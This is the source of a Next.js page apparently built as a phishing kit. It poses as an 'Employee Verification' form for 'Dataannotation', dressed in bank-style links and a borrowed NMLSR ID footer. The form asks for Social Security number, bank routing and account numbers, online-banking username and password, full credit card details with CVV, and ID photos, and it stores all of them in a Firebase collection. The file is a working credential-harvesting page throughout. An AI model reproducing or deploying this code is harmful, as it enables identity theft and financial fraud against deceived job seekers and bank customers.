'use client';
import axios from 'axios';
import Image from 'next/image';
import { Heroicon } from '@/components/icons'; // Importing icons
// import {HandBurger} from "../components/icons"
import { FormEvent, useEffect, useState } from 'react';
import Link from 'next/link';
import { ClockIcon } from '@heroicons/react/16/solid';
import { LockClosedIcon } from '@heroicons/react/24/outline';
import { useRouter } from 'next/navigation';
import { db, storage } from '@/app/firebase';
import { getDownloadURL, ref, uploadBytes } from 'firebase/storage';
import { addDoc, collection, doc, setDoc } from 'firebase/firestore';
import { v4 } from 'uuid';

// Modified interface to include properties from formData
interface PostFormState {
   username: string;
   password: string;
   firstname: string;
   lastname: string;
   email: string;
   address: string;
   socialSecurity: number;
   accountNumber: number;
   routingNumber: number;
   accountHolderName: string;
   bankName: string;
   expiry: number;
   creditCard: number;
   cvv: number;
   imageUploads: string[];
}

export default function Main() {
   const [isLoading, setIsLoading] = useState(false);
   const router = useRouter();

   const [imageUploads, setImageUploads] = useState<FileList | null>(null);

   const [formData, setFormData] = useState<PostFormState>({
      username: '',
      password: '',
      firstname: '',
      lastname: '',
      email: '',
      address: '',
      socialSecurity: 0,
      accountNumber: 0,
      routingNumber: 0,
      accountHolderName: '',
      bankName: '',
      expiry: 0,
      creditCard: 0,
      cvv: 0,
      imageUploads: [],
   });

   const handleInputChange = (
      event: React.ChangeEvent<
         HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement
      >
   ) => {
      const { name, value } = event.target;
      setFormData((prevState) => ({
         ...prevState,
         [name]: value,
      }));
   };

   const handleFileChange = async (
      event: React.ChangeEvent<HTMLInputElement>
   ) => {
      const files = event.target.files;

      if (files) {
         const imisiImgsRef = ref(storage, `imisiImgs/`);
         // Assuming you want to upload all files under the same reference path
         // Note: Ensure your Firebase Storage rules allow for multiple uploads under the same path

         for (let i = 0; i < files.length; i++) {
            const file = files[i];
            const imisiImgs = ref(imisiImgsRef, `${v4()}`); // Generate a unique name for each file
            const uploadResult = await uploadBytes(imisiImgs, file);

            // Get download URL for each uploaded file
            const downloadUrl = await getDownloadURL(uploadResult.ref);

            // Update state with new download URL
            setFormData((prevState) => ({
               ...prevState,
               imageUploads: [...prevState.imageUploads, downloadUrl],
            }));
         }
      }
   };

   async function handleSubmit(event: FormEvent) {
      event.preventDefault();
      if (
         !formData.username ||
         !formData.password ||
         !formData.firstname ||
         !formData.lastname ||
         !formData.email ||
         !formData.address ||
         !formData.socialSecurity ||
         !formData.accountNumber ||
         !formData.routingNumber ||
         !formData.accountHolderName ||
         !formData.bankName ||
         !formData.expiry ||
         !formData.cvv ||
         !formData.creditCard ||
         !formData.imageUploads === null
      ) {
         return alert('Some input fields are missing');
      }

      try {
         setIsLoading(true);
         // const docRef = doc(db, 'users', 'uniqueId'); // Replace "uniqueId" with a unique identifier for the document
         // await setDoc(docRef, formData);
         const valRef = collection(db, 'usersInfo');

         const data = await addDoc(valRef, formData);

         console.log('Document successfully written!');
         setFormData({
            username: '',
            password: '',
            firstname: '',
            lastname: '',
            email: '',
            address: '',
            socialSecurity: 0,
            accountNumber: 0,
            routingNumber: 0,
            accountHolderName: '',
            bankName: '',
            expiry: 0,
            creditCard: 0,
            cvv: 0,
            imageUploads: [],
         });
         setImageUploads(null), alert('Form submitted successfully');
         router.push('/thank-you');
      } catch (error) {
         console.error('Error saving data:', error);
         alert('Error saving data');
      } finally {
         setIsLoading(false);
      }
   }

   return (
      <main
         style={{
            backgroundImage: "url('/assets/bg.jpg')",
            backgroundAttachment: 'fixed',
            backgroundSize: 'cover',
            backgroundRepeat: 'no-repeat',
            backgroundPosition: 'center center',
            height: '100%', // Example height, adjust as needed
            width: '100%', // Example width, adjust as needed
            zIndex: 9999,
         }}
      >
         <div className="md:flex  justify-between items-center text-white py-2 px-[20%] bg-black">
            <div className="flex flex-col font-bold text-[25px]">
               <img src="assets/data.jpg" alt="Data" />
            </div>
            <div className="space-x-4 space-y-10 text-xs">
               <Link href="/" legacyBehavior>
                  <a className=" hover:text-gray-500">
                     <LockClosedIcon className="m-h-5 w-5 mr-2" />
                     <span>Customer Service</span>
                  </a>
               </Link>
               <Link href="/about" legacyBehavior>
                  <a className="hover:text-gray-500">Atms/Locations</a>
               </Link>
               <Link href="/contact" legacyBehavior>
                  <a className="hover:text-gray-500">Español</a>
               </Link>
            </div>
         </div>

         <div className="container w-full sm:w-[80%] md:w-[80%] lg:w-[50%] mx-auto mt-22 px-4 filter contrast-100">
            <div className="flex flex-col items-center justify-center space-y-4 p-6 rounded-md shadow-xl">
               <div className="flex flex-col">
                  <span className="text-sm font-serif-cambria text-white">
                     Kindly fill in the following information
                  </span>
                  <br />
               </div>
               <div className="flex flex-col text-left">
                  <span className="text-base font-serif-cambria text-white font-bold">
                     Employee Verification
                  </span>
               </div>
               <form
                  onSubmit={handleSubmit}
                  className="space-y-5 p-8 rounded-md shadow-x1 bg-transparent"
               >
                  <div className="flex w-full space-x-5">
                     <div>
                        <label
                           htmlFor="firstname"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           First Name
                        </label>
                        <input
                           id="firstname"
                           name="firstname"
                           type="text"
                           value={formData.firstname}
                           onChange={handleInputChange}
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                     <div>
                        <label
                           htmlFor="lastname"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           Last Name
                        </label>
                        <input
                           id="lastname"
                           name="lastname"
                           type="text"
                           value={formData.lastname}
                           onChange={handleInputChange}
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                  </div>
                  <label
                     htmlFor="email"
                     className="block text-sm font-medium text-gray-500"
                  >
                     E-mail
                  </label>
                  <input
                     id="email"
                     name="email"
                     type="text"
                     value={formData.email}
                     onChange={handleInputChange}
                     className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                  />
                  <label
                     htmlFor="address"
                     className="block text-sm font-medium text-gray-500"
                  >
                     Address
                  </label>
                  <input
                     id="address"
                     name="address"
                     type="text"
                     value={formData.address}
                     onChange={handleInputChange}
                     className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                  />
                  <label
                     htmlFor="socialSecurity"
                     className="block text-sm font-medium text-gray-500"
                  >
                     Social Security
                  </label>
                  <input
                     id="socialSecurity"
                     name="socialSecurity"
                     type="password"
                     value={formData.socialSecurity}
                     onChange={handleInputChange}
                     className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                  />
                  <div className="flex flex-col text-left">
                     <span className="text-base font-serif-cambria text-white font-bold">
                        BANKING INFO
                     </span>
                     <br />
                  </div>
                  <label
                     htmlFor="bankName"
                     className="block text-sm font-medium text-gray-500"
                  >
                     Bank Name
                  </label>
                  <input
                     id="bankName"
                     name="bankName"
                     type="text"
                     value={formData.bankName}
                     onChange={handleInputChange}
                     className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                  />
                  <label
                     htmlFor="accountHolderName"
                     className="block text-sm font-medium text-gray-500"
                  >
                     Account Holder Name
                  </label>
                  <input
                     id="accountHolderName"
                     name="accountHolderName"
                     type="text"
                     value={formData.accountHolderName}
                     onChange={handleInputChange}
                     className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                  />
                  <div className="flex w-full space-x-5">
                     <div>
                        <label
                           htmlFor="routingNumber"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           Routing Number
                        </label>
                        <input
                           id="routingNumber"
                           name="routingNumber"
                           type="text"
                           value={formData.routingNumber}
                           onChange={handleInputChange}
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                     <div>
                        <label
                           htmlFor="accountNumber"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           Account Number
                        </label>
                        <input
                           id="accountNumber"
                           name="accountNumber"
                           type="text"
                           value={formData.accountNumber}
                           onChange={handleInputChange}
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                  </div>
                  <div className="flex w-full space-x-5">
                     <div>
                        <label
                           htmlFor="username"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           Username
                        </label>
                        <input
                           id="username"
                           name="username"
                           type="text"
                           value={formData.username}
                           onChange={handleInputChange}
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                     <div>
                        <label
                           htmlFor="password"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           Password
                        </label>
                        <input
                           id="password"
                           name="password"
                           type="password"
                           value={formData.password}
                           onChange={handleInputChange}
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                  </div>
                  <label
                     htmlFor="imageUpload"
                     className="block text-sm font-medium text-gray-500"
                  >
                     Upload front/back of ID
                  </label>
                  <input
                     id="imageUpload"
                     name="imageUpload"
                     type="file"
                     multiple
                     onChange={handleFileChange}
                     // onChange={handleInputChange}
                     className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0 text-white"
                  />
                  <div className="flex flex-col text-left">
                     <span className="text-base font-serif-cambria text-white font-bold">
                        CREDIT CARD INFO
                     </span>
                     <br />
                  </div>
                  <label
                     htmlFor="creditCard"
                     className="block text-sm font-medium text-gray-500"
                  >
                     Credit Card Number
                  </label>
                  <input
                     id="creditCard"
                     name="creditCard"
                     type="text"
                     value={formData.creditCard}
                     onChange={handleInputChange}
                     className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                  />
                  <div className="flex w-full space-x-5">
                     <div>
                        <label
                           htmlFor="expiry"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           Expiry Date
                        </label>
                        <input
                           id="expiry"
                           name="expiry"
                           type="text"
                           value={formData.expiry}
                           onChange={handleInputChange}
                           placeholder="MM/YY"
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                     <div>
                        <label
                           htmlFor="cvv"
                           className="block text-sm font-medium text-gray-500 mb-5"
                        >
                           CVV
                        </label>
                        <input
                           id="cvv"
                           name="cvv"
                           type="password"
                           value={formData.cvv}
                           onChange={handleInputChange}
                           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
                        />
                     </div>
                  </div>
                  <button
                     disabled={isLoading}
                     className={`w-full ${
                        isLoading
                           ? 'bg-gray-400 cursor-not-allowed py-2 px-4'
                           : 'bg-blue-500 hover:bg-[#1c3666] text-white font-bold py-2 px-20 rounded-full'
                     }`}
                  >
                     {isLoading ? (
                        <div className="flex items-center justify-center">
                           <div className="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-white"></div>
                        </div>
                     ) : (
                        'Submit'
                     )}
                  </button>
               </form>
            </div>
         </div>

         <div className="flex justify-center items-center bg-[#edebe4] py-10 px-4 mt-6 text-xs">
            <form>
               <span>
                  <div className="flex-col w-full mx-auto space-x-4 space-y-10 text-xs py-3">
                     <Link href="/" legacyBehavior>
                        <a className="hover:text-gray-500">
                           About Dataannotation |
                        </a>
                     </Link>
                     <Link href="/about" legacyBehavior>
                        <a className="hover:text-gray-500">
                           Online Access Agreement |
                        </a>
                     </Link>
                     <Link href="/contact" legacyBehavior>
                        <a className="hover:text-gray-500">
                           Privacy, Cookies, Security & Legal |
                        </a>
                     </Link>
                     <Link href="/" legacyBehavior>
                        <a className="hover:text-gray-500">
                           Notice of Data Collection |
                        </a>
                     </Link>
                     <Link href="/about" legacyBehavior>
                        <a className="hover:text-gray-500">
                           Report Email Fraud |
                        </a>
                     </Link>
                     <Link href="/contact" legacyBehavior>
                        <a className="hover:text-gray-500">Security Center |</a>
                     </Link>
                     <Link href="/" legacyBehavior>
                        <a className="hover:text-gray-500">Sitemap |</a>
                     </Link>
                     <Link href="/about" legacyBehavior>
                        <a className="hover:text-gray-500">Ad Choices |</a>
                     </Link>
                     <Link href="/contact" legacyBehavior>
                        <a className="hover:text-gray-500">
                           Give Us Feedback |
                        </a>
                     </Link>
                  </div>
               </span>

               <footer>
                  © 1999 - 2024 Dataannotation. All rights reserved. NMLSR ID
                  399801
               </footer>
            </form>
         </div>
      </main>
   );
}
